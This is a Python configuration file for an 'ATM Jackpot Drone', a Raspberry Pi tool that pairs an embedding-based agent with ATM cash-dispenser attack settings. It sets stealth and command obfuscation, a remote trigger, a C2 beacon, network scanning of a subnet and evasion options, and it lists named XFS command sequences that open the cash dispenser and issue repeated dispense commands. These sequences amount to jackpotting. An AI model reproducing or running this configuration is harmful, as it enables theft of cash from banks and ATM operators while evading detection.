#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
config.py - Central configuration for Edge AI ATM Jackpot Drone
Optimized for Raspberry Pi Zero W (512MB RAM, ARMv6)
"""

import os
import json
from pathlib import Path

# ============================================================================
# BASE PATHS
# ============================================================================

BASE_DIR = Path(__file__).parent.absolute()
DATA_DIR = BASE_DIR / 'data'
MODELS_DIR = BASE_DIR / 'models'
DATASETS_DIR = BASE_DIR / 'datasets'
LOGS_DIR = BASE_DIR / 'logs'
TEMPLATES_DIR = BASE_DIR / 'templates'

# Create all directories
for d in [DATA_DIR, MODELS_DIR, DATASETS_DIR, LOGS_DIR, TEMPLATES_DIR]:
    d.mkdir(exist_ok=True, parents=True)

# ============================================================================
# FAISS & RAG CONFIGURATION
# ============================================================================

FAISS_INDEX_PATH = str(DATA_DIR / 'faiss_index.bin')
TEXTS_PATH = str(DATA_DIR / 'texts.npy')
RESPONSES_PATH = str(DATA_DIR / 'responses.npy')
DB_PATH = str(DATA_DIR / 'brain.db')

# ============================================================================
# MODEL CONFIGURATION
# ============================================================================

EMBEDDING_MODEL = 'all-MiniLM-L6-v2'
EMBEDDING_DIM = 384
ONNX_MODEL_PATH = str(MODELS_DIR / 'embedder.onnx')

RERANKER_MODEL = 'cross-encoder/ms-marco-MiniLM-L-2-v2'
RERANKER_ONNX_PATH = str(MODELS_DIR / 'reranker.onnx')

# ============================================================================
# JACKPOT / XFS EXPLOITATION CONFIGURATION
# ============================================================================

JACKPOT_CONFIG = {
    'enabled': True,
    'auto_arm': False,  # Auto-arm on startup (set to True for headless)
    'max_dispense': 2000,
    'retry_count': 3,
    'watchdog_interval': 5.0,
    'command_timeout': 10,
    'log_path': str(LOGS_DIR / 'jackpot.log'),
    'web_port': 8080,
    'web_host': '0.0.0.0',
    'stealth_mode': True,  # Obfuscate XFS commands
    'remote_trigger_enabled': True,
}

# ============================================================================
# XFS PROTOCOL CONFIGURATION
# ============================================================================

XFS_CONFIG = {
    'executable': 'xfsc.exe',  # Windows executable (for cross-compilation)
    'default_device': 'CashDispenser_1',
    'ports': [7777, 8888, 9999, 8080, 443, 80, 22, 23],
    'network_timeout': 5,
    'session_timeout': 30,
    'retry_delay': 1.0,
    'probe_timeout': 2,
    'max_connections': 10,
}

# ============================================================================
# NETWORK DISCOVERY CONFIGURATION
# ============================================================================

NETWORK_CONFIG = {
    'discovery_subnet': '192.168.1.0/24',
    'scan_interval': 60,  # Seconds between autonomous scans
    'max_targets': 100,
    'stealth_mode': True,
    'beacon_interval': 600,  # C2 beacon every 10 minutes
    'ping_timeout': 1,
    'port_scan_timeout': 0.5,
    'concurrent_scans': 5,
}

# ============================================================================
# AGENT / LLM CONFIGURATION
# ============================================================================

AGENT_CONFIG = {
    'max_context_length': 2048,
    'max_retrieval_k': 10,
    'memory_limit': 1000,
    'use_onnx': True,
    'quantize_int8': True,
    'fallback_to_cpu': True,
    'temperature': 0.7,
    'top_k': 5,
}

# ============================================================================
# SYSTEM / PI OPTIMIZATION
# ============================================================================

PI_CONFIG = {
    'swap_size_mb': 1024,
    'thermal_throttle_temp': 80,  # Celsius
    'low_memory_mode': True,
    'disable_bluetooth': True,
    'wifi_power_save': False,
    'cpu_governor': 'ondemand',
    'disable_leds': True,
}

# ============================================================================
# SECURITY & EVASION
# ============================================================================

SECURITY_CONFIG = {
    'disable_system_commands': False,
    'require_authentication': False,
    'auth_password': 'changeme',
    'log_all_commands': True,
    'wipe_on_detection': False,
    'command_obfuscation': True,
    'log_rotation_size_mb': 10,
    'max_log_files': 5,
}

# ============================================================================
# TRAINING DATA PATHS
# ============================================================================

TRAINING_DATA_PATHS = {
    'train': str(DATASETS_DIR / 'train.csv'),
    'test': str(DATASETS_DIR / 'test.csv'),
    'enriched': str(DATASETS_DIR / 'atm_full_realistic_enriched.csv'),
    'attack_chains': str(DATASETS_DIR / 'atm_attack_chain_dataset.csv'),
    'vulnerability_complete': str(DATASETS_DIR / 'atm_vulnerability_complete.csv'),
    'embeddings': str(DATASETS_DIR / 'atm_vulnerability_embeddings.parquet'),
}

# ============================================================================
# XFS COMMAND DEFINITIONS
# ============================================================================

XFS_COMMANDS = {
    'cdm_dispense': {
        'command': 'cdm dispense',
        'params': ['amount', 'count'],
        'description': 'Dispense cash from ATM'
    },
    'cdm_status': {
        'command': 'cdm status',
        'params': [],
        'description': 'Get cash dispenser status'
    },
    'cdm_caps': {
        'command': 'cdm caps',
        'params': [],
        'description': 'Get cash dispenser capabilities'
    },
    'cdm_reset': {
        'command': 'cdm reset',
        'params': [],
        'description': 'Reset cash dispenser'
    },
    'cdm_denominate': {
        'command': 'cdm denominate',
        'params': ['amount', 'currency'],
        'description': 'Denominate cash for dispensing'
    },
    'cdm_open': {
        'command': 'open',
        'params': ['device_name'],
        'description': 'Open connection to XFS device'
    },
    'cdm_close': {
        'command': 'close',
        'params': ['device_name'],
        'description': 'Close XFS device connection'
    },
    'cdm_present': {
        'command': 'cdm present',
        'params': ['amount'],
        'description': 'Present cash to customer'
    },
}

# ============================================================================
# EXPLOIT SEQUENCES
# ============================================================================

EXPLOIT_SEQUENCES = {
    'classic': [
        'open CashDispenser_1',
        'cdm caps',
        'cdm status',
        'cdm reset',
        'cdm dispense 100 20',
        'cdm close'
    ],
    'bypass': [
        'open CashDispenser_1',
        'cdm reset',
        'cdm dispense 100 20',
        'cdm dispense 100 20',
        'cdm close'
    ],
    'rapid': [
        'open CashDispenser_1',
        'cdm dispense 100 20',
        'cdm dispense 100 20',
        'cdm dispense 100 20',
        'cdm close'
    ],
    'stealth': [
        'open CashDispenser_1',
        'cdm status',
        'cdm dispense 50 10',
        'cdm status',
        'cdm dispense 50 10',
        'cdm close'
    ],
    'maximum': [
        'open CashDispenser_1',
        'cdm caps',
        'cdm status',
        'cdm reset',
        'cdm dispense 100 40',
        'cdm dispense 100 40',
        'cdm dispense 100 40',
        'cdm close'
    ]
}

# ============================================================================
# LOAD ENVIRONMENT VARIABLES (Override configs)
# ============================================================================

for key, value in os.environ.items():
    if key.startswith('JACKPOT_'):
        config_key = key.replace('JACKPOT_', '').lower()
        if config_key in JACKPOT_CONFIG:
            try:
                JACKPOT_CONFIG[config_key] = json.loads(value)
            except:
                JACKPOT_CONFIG[config_key] = value

# ============================================================================
# LOGGING CONFIGURATION
# ============================================================================

LOG_LEVEL = 'INFO'
DEBUG = False
LOG_FILE = str(LOGS_DIR / 'agent.log')

# ============================================================================
# HELPER FUNCTIONS
# ============================================================================

def get_config():
    """Return all configuration as a dictionary"""
    return {
        'data_dir': str(DATA_DIR),
        'models_dir': str(MODELS_DIR),
        'jackpot': JACKPOT_CONFIG,
        'xfs': XFS_CONFIG,
        'network': NETWORK_CONFIG,
        'agent': AGENT_CONFIG,
        'pi': PI_CONFIG,
        'security': SECURITY_CONFIG,
        'exploit_sequences': EXPLOIT_SEQUENCES,
    }

def save_config():
    """Save current configuration to file"""
    config_file = BASE_DIR / 'config_backup.json'
    with open(config_file, 'w') as f:
        json.dump(get_config(), f, indent=2)
    return str(config_file)

# ============================================================================
# PRINT CONFIG SUMMARY (for debugging)
# ============================================================================

if __name__ == '__main__':
    print("=" * 60)
    print("📋 ATM Jackpot Drone Configuration")
    print("=" * 60)
    print(f"Data Directory:   {DATA_DIR}")
    print(f"Models Directory: {MODELS_DIR}")
    print(f"Logs Directory:   {LOGS_DIR}")
    print(f"FAISS Index:      {FAISS_INDEX_PATH}")
    print(f"Database:         {DB_PATH}")
    print(f"Web Port:         {JACKPOT_CONFIG['web_port']}")
    print(f"Discovery Subnet: {NETWORK_CONFIG['discovery_subnet']}")
    print(f"XFS Ports:        {XFS_CONFIG['ports']}")
    print(f"Stealth Mode:     {JACKPOT_CONFIG['stealth_mode']}")
    print(f"Auto Arm:         {JACKPOT_CONFIG['auto_arm']}")
    print("=" * 60)
